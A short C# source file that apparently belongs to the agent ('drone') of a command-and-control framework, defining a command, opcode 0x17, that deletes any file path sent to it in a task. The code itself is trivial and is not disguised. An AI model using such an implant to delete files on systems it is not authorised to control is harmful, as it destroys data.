using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class RemoveFile : DroneCommand
{
    public override byte Command => 0x17;
    public override bool Threaded => false;

    public override Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        File.Delete(task.Arguments["path"]);
        return Task.CompletedTask;
    }
}